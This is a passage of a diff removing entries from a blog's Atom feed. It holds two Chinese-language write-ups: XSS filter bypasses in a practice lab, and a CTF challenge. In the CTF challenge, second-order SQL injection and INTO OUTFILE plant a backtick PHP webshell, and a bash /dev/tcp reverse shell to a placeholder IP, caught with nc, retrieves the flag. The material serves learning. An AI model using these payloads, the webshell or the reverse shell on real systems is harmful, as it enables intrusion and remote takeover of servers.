str_ireplace() 函数执行不区分大小写的搜索。<br><img src="/2018/12/01/xss跨站脚本攻击-1/1.PNG" alt=" "></p><h5 id="1-大小写绕过-lt-sCript-gt"><a href="#1-大小写绕过-lt-sCript-gt" class="headerlink" title="(1)大小写绕过&lt; sCript&gt;"></a>(1)大小写绕过&lt; sCript&gt;</h5><h5 id="2-双写绕过-lt-scr-lt-script-gt-ipt-gt"><a href="#2-双写绕过-lt-scr-lt-script-gt-ipt-gt" class="headerlink" title="(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;"></a>(2)双写绕过&lt; scr&lt; script&gt;ipt&gt;</h5><p>（原文：<a href="https://blog.csdn.net/caoyouming0609/article/details/75208002）" target="_blank" rel="noopener">https://blog.csdn.net/caoyouming0609/article/details/75208002）</a>  </p><h3 id="preg-replace（）："><a href="#preg-replace（）：" class="headerlink" title="preg_replace（）："></a>preg_replace（）：</h3><p>.： 匹配除“\n”之外的任何单个字符。<br>*： 匹配前面的子表达式零次或多次。<br>所以&lt; script&gt;标签不可用，&lt; img src=”javascript:alert(‘xss’);”&gt;也不可用，我们无法依靠属性值进行跨站，但可以产生自己的事件<br>&lt; img src=”1” onerror=alert(‘xss’)&gt;</p><p>onerror是IMG标记的一个事件，只要页面发生错误，该事件立即被激活，语句中浏览器解释IMG标记时，会加载src属性引用的图片地址，该图片不存在则触发onerror事件。</p><h3 id="盗取cookie"><a href="#盗取cookie" class="headerlink" title="盗取cookie"></a>盗取cookie</h3><p>(咕~)</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;XSS-Reflected&quot;&gt;&lt;a href=&quot;#XSS-Reflected&quot; class=&quot;headerlink&quot; title=&quot;XSS (Reflected)&quot;&gt;&lt;/a&gt;XSS (Reflected)&lt;/h1&gt;&lt;p&gt;用phpstudy搭了一个渗透测试环境，从xss开始吧，难度从低到高的源码&lt;br&gt;&lt;img src=&quot;/2018/12/01/xss跨站脚本攻击-1/捕获.PNG&quot; alt=&quot; &quot;&gt;&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
-    
-    
-      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>黑白盒</title>
-    <link href="http://yoursite.com/2018/11/29/%E9%BB%91%E7%99%BD%E7%9B%92/"/>
-    <id>http://yoursite.com/2018/11/29/黑白盒/</id>
-    <published>2018-11-29T01:12:31.245Z</published>
-    <updated>2018-11-29T01:24:24.324Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="黑白盒复现-补招新题"><a href="#黑白盒复现-补招新题" class="headerlink" title="黑白盒复现(补招新题)"></a>黑白盒复现(补招新题)</h1><p>招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  </p><p>首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。</p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；</p><p>2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</p><p>3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。</p><p>4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。<br><a id="more"></a><br>在大多数情况下，文件上传漏洞一般都是指“上传的Web脚本被服务器解析从而获取网站shell权限”，也就是webshell，要完成上传漏洞攻击需要满足以下几个条件:</p><p>1、上传的文件能够被Web容器解释执行，所以文件上传后所在的目录需要解析器可以执行目录下的文件，也就是说文件目录必须在web容器覆盖路径内才行。</p><p>2、用户可以直接通过浏览器进行访问这个shell文件，如果web容器不能解析这个文件，那么也不能算是漏洞。</p><p>3、最后，上传的shell文件如果被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。<br>(来源：看雪)</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>在图片上传上我们看到上传图片的地址已知，访问地址可以看到我们上传上去的图片，所以我们可以利用SQL写入一句话getshell，再反弹shell从服务器中拿到flag。</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>网站对我们输入的一些关键字符进行了转义，但在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了该数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。  </p><p>在注册用户名时我们发现当我们的用户名为 1’ 时 登陆后显示的是 1\’ 所以网页对’进行了转义，但当我们在查看用户信息时我们的user_name<br>显示为 1’ 所以说明我们的用户名已经被存储在数据库之中，并且从数据库中提取出来不会存在转义，这就造成了一个二次注入。</p><h4 id="Into-outfile"><a href="#Into-outfile" class="headerlink" title="Into outfile"></a>Into outfile</h4><p>导出数据到pc的指定目录下。<br>在一开始的图片文件上传的时候我们看到存在/var/www/html/favicon/xxx可以读取和查看文件，所以我们将一句话写入这个地方<br>/var/www/html/一般为网站的根目录</p><h4 id="注册-lt-php-GET-x-gt"><a href="#注册-lt-php-GET-x-gt" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;</h4><p>&lt;?php <code>$_GET[x]</code>;?&gt; PHP中反引号 <code></code> 的作用是把反引号中的内容当做Shell命令执行，我们可以在新创建的的网页上传入变量x值来执行我们想要目标主机执行的命令，注册该用户可以将&lt;?php <code>$_GET[x]</code>;?&gt;写入数据库</p><h4 id="注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php"><a href="#注册-lt-php-GET-x-gt-’into-outfile’-var-www-html-favicon-4-php" class="headerlink" title="注册&lt;?php $_GET[x];?&gt;’into outfile’/var/www/html/favicon/4.php"></a>注册&lt;?php <code>$_GET[x]</code>;?&gt;’into outfile’/var/www/html/favicon/4.php</h4><p>将&lt;?php <code>$_GET[x]</code>;?&gt;从数据库中提取出来并导出到favicon/4.php<br>此时在4.php中我们就可以通过变量x来上传我们想让目标主机执行的shell命令了</p><h4 id="bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”"><a href="#bash-c-“bash-i-gt-amp-dev-tcp-9999-0-lt-amp-1-2-gt-amp-1”" class="headerlink" title="bash -c “bash -i &gt;&amp; /dev/tcp//9999 0&lt;&amp;1 2&gt;&amp;1”"></a>bash -c “bash -i &gt;&amp; /dev/tcp/<your-server-ip>/9999 0&lt;&amp;1 2&gt;&amp;1”</your-server-ip></h4><p>首先，bash -c 就是运行shell脚本 bash -i是打开一个交互的bash，/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。<br>要想了解“&gt;&amp;”、“0&gt;&amp;1”和2&gt;&amp;1，首先我们要先了解一下Linux文件描述符和重定向。</p><p>linux shell下常用的文件描述符是：</p><ol><li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p></li><li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p></li><li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p></li></ol><p>&amp;可以理解为c语言中的取地址符（n&lt;&amp;word 是把word复制给n，n&gt;&amp;word是把word复制给n。）2&gt;&amp;1是将标准错误输出合并到标准输出中，&amp;&gt;是将标准错误输出定向到标准输出中。也就是输出标准输出的同时也会输出标准错误输出。这句话的意思创建一个可交互的bash和一个到xxx.xxx.xxx.xxx的TCP链接，然后将bash的输入输出错误都重定向到在xxx.xxx.xxx.xxx监听的进程。简单来说就是A主机可以通过执行B主机上的命令并且把返回值都返回到A上。</p><h5 id="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…"><a href="#这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell-复现的时候就在这出了问题，菜的真实…" class="headerlink" title="这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)"></a>这里需要注意的是你的本机地址必须是公网ip，局域网ip目标主机无法识别，就无法实现反弹shell(复现的时候就在这出了问题，菜的真实….)</h5><p>之后再服务器开启监听 nc -lvnp 9999  </p><p>现在我们之前所传的一句话就派上了用场，在4.php的地址后构造?x=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp/<your-server-ip>/9999 0%3C%26%202%3E%261%22 就可以让目标主机执行这个命令  </your-server-ip></p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>A主机开启9999端口的tcp服务<br>B主机连接到A主机的9999的tcp服务<br>A主机通过tcp服务把命令发到B主机<br>B主机读取命令并且在bash中执行<br>B主机把执行结果发给A主机</p><p>拿到shell之后就可以 cd / 进入主目录，主目录中存在包含flag的文件<br><img src="/2018/11/29/黑白盒/1.png" alt=" "><br>cat读取文件就可以拿到flag</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;黑白盒复现-补招新题&quot;&gt;&lt;a href=&quot;#黑白盒复现-补招新题&quot; class=&quot;headerlink&quot; title=&quot;黑白盒复现(补招新题)&quot;&gt;&lt;/a&gt;黑白盒复现(补招新题)&lt;/h1&gt;&lt;p&gt;招新赛的时候没做这道题，前几天听止痒学长讲完之后觉得里面有很多知识点没有了解过，复现的时候也出现了问题，所以把完整的步骤和其中涉及的知识点整理出来吧。  &lt;/p&gt;
-&lt;p&gt;首先我们可以看到界面中只有登陆和注册可以打开，可能会存在sql注入，同时在头像处可以上传文件，又可能存在文件上传漏洞。&lt;/p&gt;
-&lt;h3 id=&quot;文件上传漏洞&quot;&gt;&lt;a href=&quot;#文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞&quot;&gt;&lt;/a&gt;文件上传漏洞&lt;/h3&gt;&lt;h4 id=&quot;分类&quot;&gt;&lt;a href=&quot;#分类&quot; class=&quot;headerlink&quot; title=&quot;分类&quot;&gt;&lt;/a&gt;分类&lt;/h4&gt;&lt;p&gt;1、上传文件是PHP、JSP、ASP等脚本代码，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行；&lt;/p&gt;
-&lt;p&gt;2、上传文件是crossdomain.xml，导致可以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);&lt;/p&gt;
-&lt;p&gt;3、上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行植入到pc中。&lt;/p&gt;
-&lt;p&gt;4、上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Web复现" scheme="http://yoursite.com/categories/Web%E5%A4%8D%E7%8E%B0/"/>
-    
-    
-      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
     
   </entry>
   
